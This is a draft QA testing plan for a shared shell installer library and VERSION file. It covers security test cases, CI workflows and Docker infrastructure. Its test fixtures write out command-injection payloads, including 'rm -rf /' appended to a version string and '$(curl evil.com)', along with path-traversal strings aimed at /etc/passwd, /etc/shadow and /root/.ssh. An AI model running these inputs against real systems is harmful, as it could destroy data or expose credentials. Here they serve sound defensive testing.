---
title: "QA Engineer Analysis - Issue #33"
description: "Testing strategy for shared installer-common library and VERSION file"
issue: 33
analyst: "qa-engineer"
date: "2025-10-06"
status: "draft"
---

# QA Engineer Analysis - Issue #33

## Executive Summary

**Complexity**: **XL** - Multi-repo integration testing with security validation

**Key Risk**: Cross-repository testing complexity and security test coverage

**Critical Path**: Container-based test infrastructure → Security test suite → Integration test matrix

## 1. Implementation Approach

### Testing Strategy for Shared Libraries

**Unit Testing** (`lib/installer-common/`)

- Test each utility function in isolation
- Mock all external dependencies (filesystem, network, user input)
- Coverage target: 95%+ for security-critical functions
- Test categories:
  - Input sanitization (SQL injection, command injection, path traversal)
  - Path validation (absolute/relative, symlinks, `.../`, special chars)
  - Version comparison (semver parsing, compatibility checks)
  - Error handling (missing files, permission denied, invalid input)

**Integration Testing** (AIDA install.sh)

- Dogfooding: AIDA's install.sh uses shared library
- Validates library works in real-world scenario
- Test both modes: normal install, dev mode
- Version compatibility: VERSION file read, parsed, validated

### Cross-Repository Test Approach

**Challenge**: Testing AIDA ↔ dotfiles integration without coupling repos

**Solution**: Multi-stage Docker-based tests

```bash
# Stage 1: Test AIDA standalone (current behavior)
docker run test-aida-standalone

# Stage 2: Test dotfiles sourcing AIDA library
docker run test-dotfiles-with-aida

# Stage 3: Test version mismatches
docker run test-version-compatibility
```

**Test Matrix**:

| AIDA Version | Dotfiles Version | Expected Result | Test Scenario |
|--------------|------------------|-----------------|---------------|
| 0.1.1        | 0.1.0            | Warning + Continue | Minor mismatch |
| 0.2.0        | 0.1.0            | Error + Abort | Major mismatch |
| 0.1.1        | 0.1.1            | Success | Exact match |
| Not installed| Any              | Graceful fallback | AIDA optional |
| 0.1.1        | 0.1.2            | Success | Dotfiles newer |

### Security Testing Methodology

**Attack Vectors to Test**:

1. **Command Injection**
   - Input: `version="1.0; rm -rf /"`
   - Input: `path="/tmp/../../../etc/passwd"`
   - Input: `name="test$(curl evil.com)"`

2. **Path Traversal**
   - Input: `~/.aida/../../../etc/passwd`
   - Input: `/tmp/test/../../root/.ssh/`
   - Input: Symlinks pointing outside allowed directories

3. **Variable Injection**
   - Unquoted variables in shell commands
   - Unsanitized user input in `eval` or command substitution
   - Environment variable pollution

**Security Test Implementation**:

```bash
# Test: Command injection in version string
test_version_command_injection() {
  local malicious_version='0.1.0; echo "PWNED" > /tmp/pwned'

  # Should NOT execute the echo command
  if validate_version "$malicious_version"; then
    fail "Command injection vulnerability"
  fi

  # Verify injection didn't execute
  [[ ! -f /tmp/pwned ]] || fail "Command was executed"
}

# Test: Path traversal in library sourcing
test_path_traversal_sourcing() {
  local malicious_path="~/.aida/lib/../../etc/passwd"

  # Should fail validation
  if validate_library_path "$malicious_path"; then
    fail "Path traversal vulnerability"
  fi
}

# Test: Symlink attacks
test_symlink_attacks() {
  local attack_dir="/tmp/symlink-attack"
  mkdir -p "$attack_dir"
  ln -s /etc/passwd "$attack_dir/VERSION"

  # Should detect and reject symlink outside allowed path
  if source_version_file "$attack_dir/VERSION"; then
    fail "Symlink attack succeeded"
  fi
}
```

### Test Automation Recommendations

**CI/CD Pipeline**:

```yaml
# .github/workflows/test-installer-common.yml
name: Test Installer Common Library

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run unit tests
        run: ./test/unit/test-installer-common.sh

  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Test AIDA install.sh (dogfooding)
        run: ./test/integration/test-aida-install.sh

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run security test suite
        run: ./test/security/test-injection-attacks.sh

  cross-repo-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        aida_version: [0.1.0, 0.1.1, 0.2.0]
        dotfiles_version: [0.1.0, 0.1.1]
    steps:
      - name: Test version compatibility
        run: ./test/integration/test-cross-repo.sh

  shellcheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Shellcheck lib/installer-common/
        run: shellcheck lib/installer-common/*.sh
```

## 2. Technical Concerns

### Testing Complexity

**High Complexity Areas**:

- **Cross-repo coordination**: Mocking dotfiles behavior without full repo
- **Version compatibility matrix**: 5+ scenarios minimum
- **Security testing**: Requires adversarial mindset, creative attack vectors
- **Container orchestration**: Docker setup for clean-room testing

**Mitigation**:

- Use test doubles/stubs for cross-repo dependencies
- Automate version matrix testing with parameterized tests
- Document attack vectors in security test suite
- Reuse existing container infrastructure from issue #16

### Coverage Requirements

**Critical Functions** (100% coverage required):

- `validate_version()` - Version string validation
- `check_version_compatibility()` - Semver comparison
- `sanitize_path()` - Path validation/sanitization
- `source_library()` - Safe sourcing of shared code

**Standard Functions** (90% coverage):

- Helper functions (logging, prompts)
- Non-security-critical utilities

**Coverage Tools**:

```bash
# Use kcov for bash coverage
kcov --exclude-pattern=/usr coverage/ ./test/unit/test-all.sh

# Generate HTML report
kcov --coveralls-id=$COVERALLS_TOKEN coverage/ ./test/
```

### Security Test Cases

**Priority 1** (Must have):

- Command injection in version strings
- Path traversal in library sourcing
- Symlink attacks on VERSION file
- Environment variable injection
- Unquoted variable expansion

**Priority 2** (Should have):

- Race conditions (TOCTOU attacks)
- Permission escalation attempts
- Resource exhaustion (infinite loops, memory leaks)
- Error message information disclosure

**Priority 3** (Nice to have):

- Fuzzing inputs (random malformed data)
- Timing attacks on version checks
- Locale/encoding attacks (UTF-8 tricks)

### Technical Risks

**Risk 1**: False sense of security

- **Impact**: High - Critical vulnerabilities missed
- **Likelihood**: Medium
- **Mitigation**: External security review, penetration testing

**Risk 2**: Test brittleness across platforms

- **Impact**: Medium - CI/CD failures on different OSes
- **Likelihood**: High (macOS vs Linux differences)
- **Mitigation**: Platform-specific test cases, matrix testing

**Risk 3**: Version compatibility regression

- **Impact**: High - Breaking changes for users
- **Likelihood**: Medium
- **Mitigation**: Regression test suite, version compatibility matrix

**Risk 4**: Test environment contamination

- **Impact**: Medium - False positives/negatives
- **Likelihood**: High (without containers)
- **Mitigation**: **MUST use containers** for all integration tests

## 3. Dependencies & Integration

### Test Infrastructure Needed

**Container Infrastructure** (from issue #16):

```dockerfile
# test/docker/Dockerfile.test-installer
FROM ubuntu:22.04

# Install test dependencies
RUN apt-get update && apt-get install -y \
  bash \
  shellcheck \
  bats \
  git \
  curl

# Copy AIDA framework
COPY . /opt/aida/

# Test entrypoint
ENTRYPOINT ["/opt/aida/test/integration/test-installer.sh"]
```

**Test Data Structure**:

```text
test/
├── unit/
│   ├── test-version-validation.sh
│   ├── test-path-sanitization.sh
│   └── test-library-sourcing.sh
├── integration/
│   ├── test-aida-install.sh
│   ├── test-cross-repo.sh
│   └── test-version-compatibility.sh
├── security/
│   ├── test-command-injection.sh
│   ├── test-path-traversal.sh
│   └── test-symlink-attacks.sh
├── fixtures/
│   ├── VERSION.valid
│   ├── VERSION.invalid
│   ├── VERSION.malicious
│   └── mock-dotfiles/
└── docker/
    ├── Dockerfile.test-installer
    └── docker-compose.test.yml
```

### Docker/Container Requirements

**Test Containers**:

1. **test-aida-standalone**: Clean Ubuntu, install AIDA only
2. **test-aida-with-dotfiles**: Install AIDA, then dotfiles
3. **test-dotfiles-first**: Install dotfiles (optional AIDA integration)
4. **test-version-mismatch**: AIDA v0.1.1 + dotfiles v0.2.0

**Container Features**:

- Non-root user (test permission scenarios)
- Tmpfs mounts (fast, isolated filesystem)
- Network isolation (no external dependencies)
- Reproducible builds (pinned base images)

**Docker Compose for Test Matrix**:

```yaml
# test/docker/docker-compose.test.yml
version: '3.8'

services:
  test-standalone:
    build:
      context: ../..
      dockerfile: test/docker/Dockerfile.test-installer
    environment:
      - TEST_SCENARIO=standalone
    tmpfs:
      - /tmp
      - /home/testuser

  test-version-compat:
    build:
      context: ../..
      dockerfile: test/docker/Dockerfile.test-installer
    environment:
      - TEST_SCENARIO=version_mismatch
      - AIDA_VERSION=0.1.1
      - DOTFILES_VERSION=0.2.0
```

### Test Data and Fixtures

**VERSION Files** (`test/fixtures/`):

```bash
# VERSION.valid
0.1.1

# VERSION.invalid
not-a-version

# VERSION.malicious
0.1.0; rm -rf /tmp/*

# VERSION.semver
1.2.3-alpha.1+build.456
```

**Mock Dotfiles Structure**:

```text
test/fixtures/mock-dotfiles/
├── install.sh              # Mock dotfiles installer
├── lib/
│   └── installer-helpers.sh
└── stow/
    └── shell/
        └── .bashrc
```

**Security Test Payloads**:

```bash
# test/fixtures/payloads/command-injection.txt
0.1.0; echo PWNED
1.0$(curl evil.com)
2.0`id > /tmp/pwned`

# test/fixtures/payloads/path-traversal.txt
~/.aida/../../etc/passwd
/tmp/../../../root/.ssh/
./../../../etc/shadow
```

## 4. Effort & Complexity

### Estimated Complexity: **XL**

**Breakdown**:

- **Unit tests**: M (3-5 days)
  - 10-15 test functions per utility
  - Mocking filesystem/network calls
  - Edge cases and error paths

- **Integration tests**: L (5-8 days)
  - Cross-repo test scenarios
  - Version compatibility matrix
  - Container orchestration

- **Security tests**: L (5-8 days)
  - Attack vector research
  - Payload development
  - Validation of mitigations

- **CI/CD automation**: M (3-5 days)
  - GitHub Actions workflows
  - Matrix testing setup
  - Coverage reporting

- **Documentation**: S (1-2 days)
  - Test suite README
  - Security test documentation
  - Runbook for failures

**Total Effort**: 17-28 days (3.5-5.5 weeks)

### Key Effort Drivers

1. **Security test coverage** (40% of effort)
   - Requires deep knowledge of attack vectors
   - Creative adversarial testing
   - Validation of all mitigations

2. **Container infrastructure** (25% of effort)
   - Multi-container orchestration
   - Version matrix testing
   - Platform-specific scenarios

3. **Cross-repo integration** (20% of effort)
   - Mocking dotfiles behavior
   - Version compatibility testing
   - Fallback scenarios

4. **CI/CD automation** (15% of effort)
   - GitHub Actions workflows
   - Matrix testing
   - Coverage reporting

### Risk Areas

**High Risk**:

- **Incomplete security coverage**: Missing attack vectors → vulnerabilities in production
- **Container environment differences**: Tests pass in containers but fail on real systems
- **Version compatibility edge cases**: Unexpected version string formats break parsing

**Medium Risk**:

- **Test maintenance burden**: Cross-repo changes require test updates in both repos
- **CI/CD pipeline complexity**: Matrix testing difficult to debug
- **False positives**: Overly strict security tests block valid scenarios

**Mitigation Strategies**:

- External security review before release
- Test on real systems in addition to containers
- Comprehensive version string test fixtures
- Clear test documentation and ownership
- Gradual matrix expansion (start simple)
- Whitelisting approach for security (fail open with warnings)

## 5. Questions & Clarifications

### Technical Questions

**Version Compatibility**:

- Q: What semver compatibility rules? (e.g., allow patch differences?)
- Q: How to handle pre-release versions (alpha, beta, rc)?
- Q: Should dotfiles pin exact AIDA version or allow ranges?

**Security Requirements**:

- Q: What's the threat model? (Malicious user? Supply chain attack?)
- Q: Should we block symlinks entirely or validate targets?
- Q: Error messages: detailed (for debugging) or vague (for security)?

**Cross-Repo Coordination**:

- Q: How to version the shared library itself?
- Q: Breaking changes: how to communicate to dotfiles repo?
- Q: Should AIDA expose a "library API version" separate from AIDA version?

**Container Testing**:

- Q: Test on which platforms? (Ubuntu 22.04, 24.04, macOS?)
- Q: Use GitHub-hosted runners or self-hosted?
- Q: Parallel test execution or sequential? (race conditions?)

### Decisions to be Made

**Decision 1**: Security posture

- **Option A**: Fail closed (strict validation, reject edge cases)
- **Option B**: Fail open (permissive, warn on suspicious input)
- **Recommendation**: Fail closed for path validation, fail open for version checks

**Decision 2**: Test scope

- **Option A**: Comprehensive (all platforms, all versions, all attack vectors)
- **Option B**: Targeted (critical paths only, expand over time)
- **Recommendation**: Start targeted, expand based on risk assessment

**Decision 3**: Container strategy

- **Option A**: Full matrix (AIDA versions × dotfiles versions × platforms)
- **Option B**: Representative samples (current version + one back)
- **Recommendation**: Representative samples initially, full matrix pre-release

**Decision 4**: Error handling in dotfiles

- **Option A**: Hard fail if AIDA version incompatible
- **Option B**: Warn and continue (AIDA is optional)
- **Recommendation**: Warn and continue (aligns with "AIDA is optional" design)

### Areas Needing Investigation

**Investigation 1**: Existing installer test coverage

- What tests already exist for install.sh?
- Can they be reused/adapted for shared library?
- What gaps exist in current coverage?

**Investigation 2**: Dotfiles installer architecture

- How does dotfiles installer currently work?
- What assumptions does it make about AIDA?
- Where will it source the shared library?

**Investigation 3**: Platform differences

- Bash version differences (macOS 3.2 vs Linux 5.x)?
- Readlink behavior (BSD vs GNU)?
- Other platform-specific gotchas?

**Investigation 4**: Security best practices

- Review OWASP guidelines for shell scripts
- Research common installer vulnerabilities
- Consult shellcheck security warnings

## Recommendations

### Immediate Actions

1. **Set up container infrastructure** (dependency for all testing)
2. **Define version compatibility rules** (blocks test case development)
3. **Create security test payload library** (reusable across tests)
4. **Implement unit tests for shared library** (fast feedback loop)

### Phased Rollout

**Phase 1** (MVP - 1 week):

- Unit tests for critical security functions
- Basic integration test (AIDA install.sh uses library)
- Command injection tests

**Phase 2** (Core - 2 weeks):

- Full security test suite
- Cross-repo integration tests
- Version compatibility matrix

**Phase 3** (Complete - 2 weeks):

- Platform-specific tests
- Comprehensive CI/CD automation
- Performance and stress testing

### Success Criteria

**Testing Success**:

- 100% coverage of security-critical functions
- All attack vectors from threat model tested
- Version compatibility matrix validated
- CI/CD pipeline green on all platforms

**Quality Metrics**:

- Zero security vulnerabilities in shared library
- Zero regressions in AIDA install.sh after refactor
- Test suite runs in < 10 minutes (CI/CD feedback speed)
- Documentation allows new contributors to add tests easily

---

**Next Steps**: Review this analysis with team, prioritize questions/decisions, begin Phase 1 implementation.
